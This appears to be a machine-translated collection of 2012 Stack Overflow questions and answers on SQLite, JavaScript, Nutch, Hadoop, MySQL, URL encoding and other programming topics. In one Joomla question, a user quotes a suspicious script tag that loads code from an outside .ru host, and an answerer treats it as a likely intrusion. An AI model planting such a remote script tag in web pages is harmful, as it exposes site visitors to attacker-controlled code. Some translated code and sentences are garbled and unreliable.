> 这是一个功能，而不是一个错误。SQLite 使用[动态类型](http://sqlite.org/datatype3.html)。它不强制执行数据类型约束。任何数据都可以插入任何列。您可以将任意长度的字符串放入整数列、布尔列中的浮点数或字符列中的日期。您在 CREATE TABLE 命令中分配给列的[数据类型](http://sqlite.org/datatype3.html)不会限制可以将哪些数据放入该列。每列都能够保存任意长度的字符串。（有一个例外：[INTEGER PRIMARY KEY](http://sqlite.org/lang_createtable.html#rowid)类型的列可能只包含一个 64 位有符号整数。如果您尝试将除整数以外的任何内容放入[INTEGER PRIMARY KEY](http://sqlite.org/lang_createtable.html#rowid)列中，则会导致错误。）
> 
> 但是 SQLite 确实使用列的声明类型作为您更喜欢该格式的值的提示。因此，例如，如果一列是 INTEGER 类型，并且您尝试将字符串插入该列，SQLite 将尝试将字符串转换为整数。如果可以，则改为插入整数。如果没有，它会插入字符串。此功能称为[类型亲和性](http://sqlite.org/datatype3.html#affinity)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T06:15:52.627

SQLite 使用动态类型，这意味着任何值都可以存储在任何列中。关于列的类型，[SQLite 文档](http://www.sqlite.org/datatype3.html)说：

> 这里的重要思想是该类型是推荐的，而不是必需的。任何列仍然可以存储任何类型的数据。

# javascript - 无法动态生成文本字段Javascript onChange

> ID：10772030
> 
> 赞同：1
> 
> 时间：2012-05-27T06:09:04.320
> 
> 标签：javascript, html, dynamic, textfield, onchange

我无法动态生成文本字段。我在表单中有一个选择框，我想做的是根据下拉列表中的数字选择创建文本字段。因此，如果用户选择一个，我想在它下面创建一个文本字段。我正在使用 javascript 和 onChange 事件来完成它。但是代码在任何浏览器中都不起作用。

这是我在文档头部使用的 javascript 函数：

```
function addField() 
 {
 alert("Hello");
 var num=document.forms["myForm"]["timePerDay"].value;
   for(var i=0;i<num;i++)
    {
    var element = document.createElement("input");

    element.setAttribute("type", input);
    element.setAttribute("name", time[] );

    var foo = document.getElementById("fooBar");

    //Append the element in page (in span).
    foo.appendChild(element);
    }
    } 
```

并且选择字段是：

```
 <select name="timePerDay" onChange="javascript:addField();"> 
<option selected="selected">Select One</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
</select>

<span id="fooBar">
</span> 
```

似乎 onChange 在任何浏览器中都没有触发，因为我试图将警报消息放入 JS 函数中，甚至它不起作用。所以你能告诉我是什么问题吗？您可以在以下位置查看该页面： http: [//motushealth.com/form1.html](http://motushealth.com/form1.html)

PS：我在表单上使用另一个 JS 函数来验证它，它适用于 Onsubmit 。它运行良好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T06:33:01.963

问题是这里的语法错误：`element.setAttribute("name", time[] );` `time[]`在 php 中有效，但在 js 中无效。

**编辑：**

另一种方法是不使用内联 js ( `...onClick='javascript:addField();'...`)。而是在事件上执行以下操作`window.onload`或更好。`onDomReady`

JS：

```
window.onload = function() {  /* or window.addEventListener */
    document.getElementById('timePerDay').onchange = addField;  /* or addEventListener */
}; 
```

标记可以是：

```
<select id="timePerDay" name="timePerDay"> 
    <option selected="selected">Select One</option>
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
</select> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T06:48:02.103

在摆弄代码两个多小时后，我终于找到了问题所在。令我惊讶的是，问题出在 JS 自身的代码中。似乎如果 JS 代码有任何问题，整个函数都不起作用，甚至没有调用 onChange。

1.  第一个问题出在名字上，所以我改了

    element.setAttribute("name", time[]) 到 element.setAttribute("name", timer[])

2.  其次，类型有逻辑错误，所以我改变了

    element.setAttribute("type", input) 到 element.setAttribute("type", text); 感谢你的帮助。我爱这个伟大的社区。继续摇摆。问候。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T07:00:09.490

出现问题的原因是由于发生了意外令牌`addField()`而根本没有加载该函数。`SyntaxError``time[]``]`

调试此类问题的一个技巧是始终从查看**Web Inspector**（如果您使用 Chrome/Safari）或**Firebug**（如果您使用 Firefox）中的控制台日志开始。

您可能还想考虑将 jQuery 用于这些类型的任务。具体来说，研究使用[`on()`](http://api.jquery.com/on/)or [`change()`](http://api.jquery.com/change/)。

# solr - Nutch：数据读取和添加元数据

> ID：10772031
> 
> 赞同：5
> 
> 时间：2012-05-27T06:09:09.190
> 
> 标签：solr, lucene, web-crawler, semantic-web, nutch

我最近开始寻找 apache nutch。我可以进行设置并能够使用 nutch 抓取我感兴趣的网页。我不太了解如何读取这些数据。我基本上想将每个页面的数据与一些元数据（现在是一些随机数据）相关联并将它们存储在本地，稍后将用于搜索（语义）。我需要同样使用 solr 或 lucene 吗？我对所有这些都是新手。据我所知，Nutch 是用来抓取网页的。它可以做一些额外的功能，比如将元数据添加到爬取的数据中吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-29T06:47:34.323

Useful commands.

Begin crawl

```
bin/nutch crawl urls -dir crawl -depth 3 -topN 5 
```

Get statistics of crawled URL's

```
bin/nutch readdb crawl/crawldb -stats 
```

Read segment (gets all the data from web pages)

```
bin/nutch readseg -dump crawl/segments/* segmentAllContent 
```

Read segment (gets only the text field)

```
bin/nutch readseg -dump crawl/segments/* segmentTextContent -nocontent -nofetch -nogenerate -     noparse -noparsedata 
```

Get all list of known links to each URL, including both the source URL and anchor text of the link.

```
bin/nutch readlinkdb crawl/linkdb/ -dump linkContent 
```

Get all URL's crawled. Also gives other information like whether it was fetched, fetched time, modified time etc.

```
bin/nutch readdb crawl/crawldb/ -dump crawlContent 
```

For the second part. i.e to add new field I am planning to use index-extra plugin or to write custom plugin.

Refer:

[this](https://issues.apache.org/jira/browse/NUTCH-422) and [this](http://wiki.apache.org/nutch/WritingPluginExample)

# java - 浏览 javascript

> ID：10772032
> 
> 赞同：0
> 
> 时间：2012-05-27T06:09:14.400
> 
> 标签：java, javascript, swing, browser, jeditorpane

我想用java编写一个简单的网络浏览器，这是我的代码！

```
import javax.swing.*;
import java.io.*;
import java.awt.*;
import java.awt.event.*;
import java.net.*;

 public class WebBrowser extends JFrame {

/**
 * 
 */
private static final long serialVersionUID = 1L;

public JPanel
    address_panel, window_panel;

public JLabel
    address_label;

public JTextField
    address_tf;

public JEditorPane
    window_pane;

public JScrollPane
    window_scroll;

public JButton
    address_b;

private Go go = new Go();

public WebBrowser() throws IOException {

    // Define address bar
    address_label = new JLabel(" address: ", SwingConstants.CENTER);
    address_tf = new JTextField("http://www.yahoo.com");
    address_tf.addActionListener(go);
    address_b = new JButton("Go");
    address_b.addActionListener(go);

    window_pane = new JEditorPane("http://www.yahoo.com");
    window_pane.setContentType("text/html");
    window_pane.setEditable(false);

    address_panel = new JPanel(new BorderLayout());
    window_panel = new JPanel(new BorderLayout());

    address_panel.add(address_label, BorderLayout.WEST);
    address_panel.add(address_tf, BorderLayout.CENTER);
    address_panel.add(address_b, BorderLayout.EAST);

    window_scroll = new JScrollPane(window_pane);
    window_panel.add(window_scroll);

    Container pane = getContentPane();
    pane.setLayout(new BorderLayout());

    pane.add(address_panel, BorderLayout.NORTH);
    pane.add(window_panel, BorderLayout.CENTER);

    setTitle("web browser");
    setSize(800,600);
    setVisible(true);
    setDefaultCloseOperation(EXIT_ON_CLOSE);

}

public class Go implements ActionListener{

    public void actionPerformed(ActionEvent ae){

        try {

            window_pane.setPage(address_tf.getText());

        } catch (MalformedURLException e) {     // new URL() failed
            window_pane.setText("MalformedURLException: " + e);
        } catch (IOException e) {               // openConnection() failed
            window_pane.setText("IOException: " + e);
        }

    }

}

public static void main(String args[]) throws IOException {
    WebBrowser wb = new WebBrowser();
}

} 
```

它适用于简单的 html 页面，但它无法加载代码的 JavaScript 部分！我的问题是我应该在代码中添加什么来加载 javascripts？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T06:33:36.353

Swing 的默认小部件仅对 HTML4 和 CSS 有非常基本的支持，完全不支持 JavaScript（默认情况下）。您可能会使用内置的 Rhino JavaScript 引擎来执行代码，但这必须手动完成并且非常困难。[HtmlUnit](http://htmlunit.sourceforge.net/)使用这种策略来解析 HTML 页面并执行 JavaScript，但它通常兼容性很差，完全没有渲染器，所以你必须自己编写（即没有显示，你只能从代码中访问页面内容） .

有一些基于 Swing 的浏览器小部件漂浮在其周围，它们嵌入了 Gecko (Firefox) 或 WebKit (Chrome/Safari) 渲染器，因此能够利用适当的 JavaScript 解释器，但它们都存在错误、昂贵或未维护。这些都支持 JavaScript，但它们通常使用各种浏览器引擎的非常旧版本，并且与现代网站的兼容性很差，此外还缺乏跨平台兼容性。

Eclipse 的[SWT](http://www.eclipse.org/swt/)项目包括一个浏览器小部件，该小部件似乎得到了积极维护，但依赖于 SWT 库，并且在 Swing 应用程序中使用起来会有些困难，尽管这可能是可行的。SWT 是与 AWT/Swing（您当前正在使用的）完全不同的 UI 工具包，为了利用它的浏览器小部件，您必须找到一种方法将其嵌入到 Swing 应用程序中，或者只使用SWT 工具包。

总的来说，SWT 的浏览器可能是您获得一个像样的 Java 浏览器的最佳选择，但使用起来可能仍然很麻烦。祝你好运！

# objective-c - 使用 [NSDate date] 获取当前日期和时间

> ID：10772033
> 
> 赞同：66
> 
> 时间：2012-05-27T06:09:35.790
> 
> 标签：objective-c, cocoa, nsdate

我系统的日期时间是 5 月 26 日 22:55，但是当我得到日期`[NSDate date]`时间是 5 月 27 日 02:35

是因为时区吗？

如果是，如何解决这个问题，当我得到日期时间时，给我系统的日期并且不检查时区

* * *

## 回答 #1

> 赞同：147
> 
> 时间：2012-05-27T06:14:13.890

```
NSLocale* currentLocale = [NSLocale currentLocale];
[[NSDate date] descriptionWithLocale:currentLocale]; 
```

或使用

```
NSDateFormatter *dateFormatter=[[NSDateFormatter alloc] init]; 
[dateFormatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
// or @"yyyy-MM-dd hh:mm:ss a" if you prefer the time with AM/PM 
NSLog(@"%@",[dateFormatter stringFromDate:[NSDate date]]); 
```

# java - 调整自动完成字段的大小黑莓

> ID：10772047
> 
> 赞同：0
> 
> 时间：2012-05-27T06:12:49.080
> 
> 标签：java, blackberry, java-me, autocomplete, blackberry-jde

我想减少我的自动完成字段的高度。如何去做

这是我的代码

```
HorizontalFieldManager hfm = new HorizontalFieldManager();
LabelField lbl = new LabelField(" Name:                 ");

final AutoCompleteField TextField1 = new AutoCompleteField(filterLst)
{
    public int getPreferredWidth() 
    {
        return Display.getWidth()/2;
    }

    public void sublayout(int maxWidth, int maxheight)
    {
        super.sublayout(getPreferredWidth(), getPreferredHeight());
        setExtent(getPreferredWidth(), getPreferredHeight());
    }
};
hfm.add(lbl);
hfm.add(TextField1);
add(hfm); 
```

下图是它的外观。我希望它看起来与我用于其他标签的编辑字段大小相同。

这是我的编辑字段代码

```
 //Add box next to field for containing input 
   HorizontalFieldManager hfm1 = new HorizontalFieldManager();
   LabelField lbl1 = new LabelField(" Amount:              ");

   final EditField TextField2 = new EditField()
   {
      boolean _drawFocus = false;
      protected void layout(int maxWidth, int maxHeight) 
      {
         super.layout(Math.min(maxWidth, 300), Math.min(maxHeight, 30));
      }
      protected boolean keyChar(char ch, int status, int time) 
      {
         if (CharacterUtilities.isDigit(ch) || (ch == Characters.BACKSPACE)) 
         {
            return super.keyChar(ch, status, time);
         }
         return true;
      }
      protected void drawFocus(Graphics graphics,boolean on) 
      {
         _drawFocus = on;
         super.drawFocus(graphics, on);
         _drawFocus = false;
      }    
      protected void paint(Graphics g)
      {       
         if ( _drawFocus ) 
         {
            super.paint(g);
            return;
         } 
         g.clear();
         g.drawRect(0,0, 50, 50);
         int oldColor = g.getColor();
         g.setColor(Color.WHITE);
         g.fillRect(0, 0, this.getPreferredWidth(), this.getPreferredHeight());
         g.setColor(oldColor);
         g.drawRect(100, 100, 50, 50);
         super.paint(g);
      }
   };
   TextField2.setBorder(BorderFactory.createRoundedBorder(new XYEdges(6,6,6,6)));
   hfm1.add(lbl1);
   hfm1.add(TextField2);
   add(hfm1); 
```

![在此处输入图像描述](../Images/febb6e73bf9c000bde1ca0c8655eb4ca.png)

我希望用于名称的自动完成字段的大小与其他字段相同。请帮助。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:49:45.113

可能给您带来麻烦的一件事`EditField`是人们通常认为的`Field`. `AutoCompleteField`但是，处理起来更像是`Manager`. 当然，它想成为 a `Manager`，因为它（可能）包含 a `EditField`，但随后还将包含另一个`Field`动态显示自动完成选项的子项。

（非管理器）`Field`和`Manager`子类处理布局略有不同，所以我发现尝试用正常的方法解决这个问题，`getPreferredHeight()`并且对我来说效果不佳。`layout()``sublayout()`

所以，我做的是双重的：

1.  `AutoCompleteField`首先，我试图用你的子类来模仿默认的装饰`EditField`。这并不完美。如果您希望它们看起来完全一样，您可能需要`paint()`为两者编写自定义方法。你说这个问题只是想调整字段的大小，所以我认为这已经足够好了。
2.  其次，由于`AutoCompleteField`似乎包含一个子 EditField（至少在逻辑上......我不确定它是否以这种方式实现），我决定尝试让 EditField 以与正常匹配的方式选择自己的大小编辑字段。为此，我通过简单地设置`Font`每个字段的高度来控制所有字段的高度。

我对您的代码的更改：

```
 final int fontSize = 24;   // pick whatever you like here
  final int pad = 2;
  final int margin = 2; 
```

我删除了`layout()`试图控制高度的编辑字段方法中的代码，因为......正如我所说，我没有成功以类似的方式设置自动完成字段的高度。我刚刚将您的编辑字段更改`layout()`为非常标准的实现：

```
 final EditField TextField2 = new EditField()
  {
     boolean _drawFocus = false;
     protected void layout(int maxWidth, int maxHeight) 
     {
        super.layout(getPreferredWidth(), getPreferredHeight());
     } 
```

然后，我在您的编辑字段上设置了填充，因为在我看来它`AutoCompleteField`使用了 2 个像素的填充（在 5.0 Storm2 上）。您可能不关心这个 UI，但它似乎也有 2 个像素的边距。

```
 TextField2.setPadding(pad, pad, pad, pad);
  TextField2.setMargin(margin, margin, margin, margin); 
```

然后，我为您的所有字段设置相同的字体。它不必是默认字体。只是让它们都一样。这一步似乎决定了由`AutoCompleteField`...设置字体绘制的圆角矩形字段的可见大小。

```
 Font font = Font.getDefault().derive(Font.PLAIN, fontSize);
  TextField1.setFont(font);
  TextField2.setFont(font); 
```

之后，编辑字段和自动完成字段的高度应该一致。我在 5.0 9550 上对此进行了测试。由于 pad 和 margin 值是通过实验确定的，我完全可以相信这些值（例如 2 个像素）可能会在不同的设备上发生变化。您可能需要进行一些实验。

# iphone - 从视图和数组中正确删除对象？

> ID：10772050
> 
> 赞同：2
> 
> 时间：2012-05-27T06:13:52.013
> 
> 标签：iphone, arrays, cocoa, memory-management

在我的“connect4”风格游戏中，我有一个表示 7x6 网格的数组，数组中的每个“单元格”都包含 NSNull 或 UIView 子类“CoinView”。以下是从 NSMutableArray 和主视图中删除对象的正确方法吗？

```
- (IBAction)debugOrigin:(id)sender {
    int x = 0;
    int y = 0;
    //get the coin object form the grid
    CoinView *coin = [[grid objectAtIndex:x] objectAtIndex:y];

    //cancel if there's no coin there
    if ([coin isKindOfClass:[NSNull class]]) { return; }

    //remove the coin from memory
    [coin removeFromSuperview];
    coin = nil;
    [[grid objectAtIndex:x] setObject:[NSNull null] atIndex:y]; //will this leak?

} 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T06:32:55.887

您的代码不会泄漏，实际上（几乎）是正确的。

您应该删除此注释，因为您没有处理代码中的内存（最终可能会让您对代码的实际作用感到困惑）：

```
//remove the coin from memory 
```

在以下行中，您将从其父视图中删除由局部变量“coin”引用的视图：

```
[coin removeFromSuperview]; 
```

然后将 nil 分配给本地变量 coin，这是确保稍后在代码中不使用它的好习惯：

```
coin = nil; 
```

据我所知，没有`setObject:AtIndex:`NSMutableArray。改用`replaceObjectAtIndex:withObject:`：

```
[[grid objectAtIndex:x] replaceObjectAtIndex:y withObject:[NSNull null]]; //will this leak? 
```

最后一点，我建议您阅读一些有关[内存管理](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html)和[内存泄漏](https://developer.apple.com/library/mac/#documentation/Performance/Conceptual/ManagingMemory/Articles/FindingLeaks.html)的内容（来自 Apple 的开发人员文档）。第一个为您提供了一些提示和技巧，使内存管理更容易理解。

# ruby - 根据时间从块中打破

> ID：10772053
> 
> 赞同：3
> 
> 时间：2012-05-27T06:14:27.913
> 
> 标签：ruby

我想运行一个块 60 秒。到目前为止，我想出的东西并没有如愿突破。

```
@start_time = Time.now
stream_some_data do |x| 
  # .. do something ...
  break if Time.now == @start_time + 60
end 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-27T07:01:17.760

Ruby 的 stdlib 已经为此提供了一个 Timeout 模块：

```
begin
  require "timeout"
  Timeout::timeout(60) do
    # all of the things...
  end
rescue Timeout::Error => e
end 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T06:39:47.767

由于您不太可能在开始后*正好*60 秒到达那条线，请尝试：

```
break if Time.now > @start_time + 60 
```

# joomla - joomla 网站顶部的垃圾邮件脚本标签

> ID：10772055
> 
> 赞同：1
> 
> 时间：2012-05-27T06:14:52.237
> 
> 标签：joomla, spam

我有一个 joomla 网站正在运行，但最近我注意到页面顶部的一个脚本标签看起来很垃圾。

```
<script type="text/javascript" src="http://lhljoi.ru/tmp/go2.php?site=13"></script> 
```

这个标签甚至在 doctype 元素之前。

由于老板不允许，我将无法分享该网站的网址。

请帮忙。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T06:24:16.593

如果您的团队没有添加此代码，则可能是有人入侵了您的系统并修改了文件，尤其是在将其放置在文档类型之前的情况下。请咨询您的服务器管理团队，并在同一台服务器上查找任何其他受感染的站点。或者尝试回滚到以前的备份

# python - # of failed Map Tasks 超出了允许的限制

> ID：10772063
> 
> 赞同：1
> 
> 时间：2012-05-27T06:18:40.963
> 
> 标签：python, hadoop, mapreduce, hadoop-streaming

我正在尝试使用 Python 处理 Hadoop 流。我通过从[这里获得帮助编写了简单的 map 和 reduce 脚本](http://pages.cs.brandeis.edu/~cs147a/lab/hadoop-example/)

`map`脚本如下：

```
#!/usr/bin/env python

import sys, urllib, re

title_re = re.compile("<title>(.*?)</title>", re.MULTILINE | re.DOTALL | re.IGNORECASE)

for line in sys.stdin:
    url = line.strip()
    match = title_re.search(urllib.urlopen(url).read())
    if match :
        print url, "\t", match.group(1).strip() 
```

脚本`reduce`如下：

```
#!/usr/bin/env python

from operator import itemgetter
import sys

for line in sys.stdin :
    line = line.strip()
    print line 
```

使用 hadoop 流 jar 运行这些脚本后，`map`任务完成，我可以看到它们 100% 完成，但`reduce`工作卡在 22%，并且在很长一段时间后它给出了`ERROR streaming.StreamJob: Job not successful. Error: # of failed Map Tasks exceeded allowed limit. FailedCount: 1.`错误。

我无法找出这背后的确切原因。

我的终端窗口如下所示：

```
shekhar@ubuntu:/host/Shekhar/Softwares/hadoop-1.0.0$ hadoop jar contrib/streaming/hadoop-streaming-1.0.0.jar -mapper /host/Shekhar/HadoopWorld/MultiFetch.py -reducer /host/Shekhar/HadoopWorld/reducer.py -input /host/Shekhar/HadoopWorld/urls/* -output /host/Shekhar/HadoopWorld/titles3
Warning: $HADOOP_HOME is deprecated.

packageJobJar: [/tmp/hadoop-shekhar/hadoop-unjar2709939812732871143/] [] /tmp/streamjob1176812134999992997.jar tmpDir=null
12/05/27 11:27:46 INFO util.NativeCodeLoader: Loaded the native-hadoop library
12/05/27 11:27:46 INFO mapred.FileInputFormat: Total input paths to process : 3
12/05/27 11:27:46 INFO streaming.StreamJob: getLocalDirs(): [/tmp/hadoop-shekhar/mapred/local]
12/05/27 11:27:46 INFO streaming.StreamJob: Running job: job_201205271050_0006
12/05/27 11:27:46 INFO streaming.StreamJob: To kill this job, run:
12/05/27 11:27:46 INFO streaming.StreamJob: /host/Shekhar/Softwares/hadoop-1.0.0/libexec/../bin/hadoop job  -Dmapred.job.tracker=localhost:9001 -kill job_201205271050_0006
12/05/27 11:27:46 INFO streaming.StreamJob: Tracking URL: http://localhost:50030/jobdetails.jsp?jobid=job_201205271050_0006
12/05/27 11:27:47 INFO streaming.StreamJob:  map 0%  reduce 0%
12/05/27 11:28:07 INFO streaming.StreamJob:  map 67%  reduce 0%
12/05/27 11:28:37 INFO streaming.StreamJob:  map 100%  reduce 0%
12/05/27 11:28:40 INFO streaming.StreamJob:  map 100%  reduce 11%
12/05/27 11:28:49 INFO streaming.StreamJob:  map 100%  reduce 22%
12/05/27 11:31:35 INFO streaming.StreamJob:  map 67%  reduce 22%
12/05/27 11:31:44 INFO streaming.StreamJob:  map 100%  reduce 22%
12/05/27 11:34:52 INFO streaming.StreamJob:  map 67%  reduce 22%
12/05/27 11:35:01 INFO streaming.StreamJob:  map 100%  reduce 22%
12/05/27 11:38:11 INFO streaming.StreamJob:  map 67%  reduce 22%
12/05/27 11:38:20 INFO streaming.StreamJob:  map 100%  reduce 22%
12/05/27 11:41:29 INFO streaming.StreamJob:  map 67%  reduce 22%
12/05/27 11:41:35 INFO streaming.StreamJob:  map 100%  reduce 100%
12/05/27 11:41:35 INFO streaming.StreamJob: To kill this job, run:
12/05/27 11:41:35 INFO streaming.StreamJob: /host/Shekhar/Softwares/hadoop-1.0.0/libexec/../bin/hadoop job  -Dmapred.job.tracker=localhost:9001 -kill job_201205271050_0006
12/05/27 11:41:35 INFO streaming.StreamJob: Tracking URL: http://localhost:50030/jobdetails.jsp?jobid=job_201205271050_0006
12/05/27 11:41:35 ERROR streaming.StreamJob: Job not successful. Error: # of failed Map Tasks exceeded allowed limit. FailedCount: 1\. LastFailedTask: task_201205271050_0006_m_000001
12/05/27 11:41:35 INFO streaming.StreamJob: killJob...
Streaming Job Failed! 
```

谁能帮帮我吗？？

**编辑** 作业跟踪器详细信息如下：

```
Hadoop job_201205271050_0006 on localhost

User: shekhar
Job Name: streamjob1176812134999992997.jar
Job File: file:/tmp/hadoop-shekhar/mapred/staging/shekhar/.staging/job_201205271050_0006/job.xml
Submit Host: ubuntu
Submit Host Address: 127.0.1.1
Job-ACLs: All users are allowed
Job Setup: Successful
Status: Failed
Failure Info:# of failed Map Tasks exceeded allowed limit. FailedCount: 1\. LastFailedTask: task_201205271050_0006_m_000001
Started at: Sun May 27 11:27:46 IST 2012
Failed at: Sun May 27 11:41:35 IST 2012
Failed in: 13mins, 48sec
Job Cleanup: Successful
Black-listed TaskTrackers: 1
Kind    % Complete  Num Tasks   Pending Running Complete    Killed  Failed/Killed
Task Attempts
map 100.00%
3   0   0   2   1   4 / 0
reduce  100.00%
1   0   0   0   1   0 / 1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-31T00:33:14.967

此错误只是一般错误，太多 Map 任务未能完成：

> # 失败的地图任务超过了允许的限制

您可以使用 EMR 控制台导航到各个 Map / Reduce 任务的日志。然后您应该能够看到问题所在。

就我而言 - 当我犯了一些小错误时出现了这个错误，比如错误地设置了 Map 脚本的路径。

查看任务日志的步骤：

[http://antipatterns.blogspot.nl/2013/03/amazon-emr-map-reduce-error-of-failed.html](http://antipatterns.blogspot.nl/2013/03/amazon-emr-map-reduce-error-of-failed.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-25T22:08:51.607

I just had the same error show up. In my case it turned out to be a parsing error. There was an "unexpected" new line at places which the stdin split the line at. I would suggest checking your data file. Once I removed the column which had these new lines it worked fine.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-23T09:34:28.447

首先检查您的标准错误。您的信息不足以确定它是什么错误，stderr 通常位于：{your hadoop temp dir here}/mapred/local/userlogs/{your job id}/{your attemp id}/stderr

Sean 的回答是您第一次使用 hadoop 时最常见的情况，所以我猜您可能会收到 'env: python\r: No such file or directory' 错误。如果是这样，只需将您的 CR 替换为 LF 即可解决此问题。只需运行脚本将 \r 替换为 \n

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-07-11T21:34:24.310

在 Mapper 和 Reducer 的开头添加以下行：

```
#!/usr/bin/python 
```

# mysql - 对 IN 使用多个 = 吗？

> ID：10772065
> 
> 赞同：1
> 
> 时间：2012-05-27T06:19:10.293
> 
> 标签：mysql, sql

这样做有什么区别：

```
SELECT person FROM population WHERE id = 1 or id = 2 or id = 3 
```

和 -

```
SELECT person FROM population WHERE id IN (1,2,3) 
```

它们的执行方式完全相同吗？有什么区别？有没有理由让你选择一个`IN`而不是多个`=`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T06:21:47.573

不，它们执行相同的操作。最小化`IN`查询字符串。*就这样。*此类语句有助于查询优化。

这两个比较运算符的一个区别是`IN`使用 a `SET`of 值进行比较，这与采用单个值的“=”或“<>”不同。

* * *

根据[手册](http://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#function_in)：

> 如果*expr*等于 IN 列表中的任何值，否则返回 0。如果所有值都是常量，则根据*expr*的类型对它们进行评估并排序。然后使用二进制搜索完成对项目的搜索。这意味着如果 IN 值列表完全由常量组成，则 IN**非常快。**

# javascript - 转义 url 中的特殊字符

> ID：10772066
> 
> 赞同：8
> 
> 时间：2012-05-27T06:19:31.740
> 
> 标签：javascript, url, special-characters

我正在使用 url 打开一个 html 页面，并且我正在使用页面 url 在查询字符串中发送数据。

例如：`abc.html?firstParameter=firstvalue&seconedParameter=seconedvalue`

问题是如果`firstvalue`or `secondvalue`in 参数包含特殊字符`#,(,),%,{`，那么我的 url 构造不好。在这种情况下 url 没有验证。我正在做这一切`javascript`。任何人都可以帮我解决这个问题。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-27T06:23:17.690

您有 3 个选项：

```
escape() will not encode: @*/+

encodeURI() will not encode: ~!@#$&*()=:/,;?+'

encodeURIComponent() will not encode: ~!*()' 
```

但是在您的情况下，如果您想将 url 传递给其他页面的 GET 参数，您应该使用 escape 或 encodeURIComponent，而不是 encodeURI。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-01-01T21:11:37.513

为了安全起见并确保您已经转义了 RFC 1738 和 RFC 3986 中指定的所有保留字符，您应该使用 encodeURIComponent、转义和替换星号（'*'）的组合，如下所示：

```
encoded = encodeURIComponent( parm ).replace(/[!'()]/g, escape).replace(/\*/g, "%2A"); 
```

[说明] 虽然 RFC 1738: Uniform Resource Locators (URL) 指定 *、!、'、( 和 ) 字符可以在 URL 中未编码，

> 因此，只有字母数字、特殊字符“$-_.+!*'()”和用于其保留目的的保留字符可以在 URL 中未编码地使用。

RFC 3986，第 12-13 页，声明这些特殊字符被保留为子分隔符。

> 保留= gen-delims / sub-delims
> 
> gen-delims = ":" / "/" / "?" /“#”/“[”/“]”/“@”
> 
> 子分隔符=“！” /“$”/“&”/“'”/“（”/“）”/“*”/“+”/“”/“;” /“=”

escape() 函数已被弃用，但可用于对感叹号、单引号、左括号和右括号进行 URL 编码。而且由于星号是否必须在 URL 中编码存在一些歧义，并且编码也没有什么坏处，因此您可以使用诸如 replace() 函数调用之类的方法显式编码。[请注意，escape() 函数作为[第二个参数传递给第一个 replace() 函数调用](https://stackoverflow.com/questions/4114080/javascript-string-replace-with-regular-expression-and-function-as-arguments "请参阅有关“JavaScript 字符串替换为正则表达式和函数作为参数”的 stackoverflow 问题")。如此处使用的，replace 为每个匹配的特殊字符 !、'、( 或 ) 调用一次 escape() 函数，并且 escape 仅返回该字符的“转义序列”以进行替换，这会将任何转义字符与另一个字符重新组合碎片。]

另请参阅[“https://stackoverflow.com/questions/6533561/urlencode-the-asterisk-star-character”](https://stackoverflow.com/questions/6533561/urlencode-the-asterisk-star-character)

此外，虽然一些网站甚至将星号（*）标识为 RFC3986 下的保留字符，但它们并未将其包含在[其 URL 组件编码工具](http://www.url-encode-decode.com/ "url-encode-decode.com 小部件")中。

未编码的 URL 参数：

```
parm1=this is a test of encoding !@#$%^&*()'
parm2=note that * is not encoded 
```

编码的 URL 参数：

```
parm1=this+is+a+test+of+encoding+%21%40%23%24%25%5E%26*%28%29%27
parm2=note+that+*+is+not+encodeds+not+encoded 
```

# maps - 谷歌地图瓷砖不透明度

> ID：10772067
> 
> 赞同：0
> 
> 时间：2012-05-27T06:19:44.750
> 
> 标签：maps, transparency

是否可以在谷歌地图 v3 中设置图块的不透明度？

我已经完成了覆盖，但我想让实际的地图图块稍微透明。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-31T16:10:20.603

如果它们始终是地图的基础“图层”，为什么要使图块透明？您是否尝试以某种方式在地图图块后面添加叠加层？

您可以使用 Google Maps API 的样式功能调整地图图块：

[http://goo.gl/3q4ex](http://goo.gl/3q4ex)

# mysql - mysql中的列顺序重要吗？

> ID：10772070
> 
> 赞同：3
> 
> 时间：2012-05-27T06:21:09.460
> 
> 标签：mysql, indexing

我在某处读到mysql中的列顺序很重要。我相信他们指的是索引列。

**问题：**如果列顺序很重要，那么它何时以及为何重要？

我问的原因是因为我在mysql中有一个类似于下面的表。主索引在左边，我在最右边有一个索引。这很糟糕吗？它是一个 MyISAM 表，主要用于选择（没有插入、删除或更新）。

```
-----------------------------------------------
|  Primary index | data1|  data2  | d3| Index |
-----------------------------------------------
|      1         |   A  |   cat   | 1 |   A   | 
|      2         |   B  |  toads  | 3 |   A   |
|      3         |   A  |  yabby  | 7 |   B   |
|      4         |   B  | rabbits | 1 |   B   |
----------------------------------------------- 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T06:32:47.280

列顺序仅在定义索引时很重要，因为这会影响索引是否适合用于执行查询。（这适用于所有 RBDMS，而不仅仅是 MySQL）

例如

`MyIndex(a, b, c)`按该顺序在列上定义的索引。

查询如

```
select a from mytable
where c = somevalue 
```

可能不会使用该索引来执行查询（取决于行数、列选择性等几个因素）

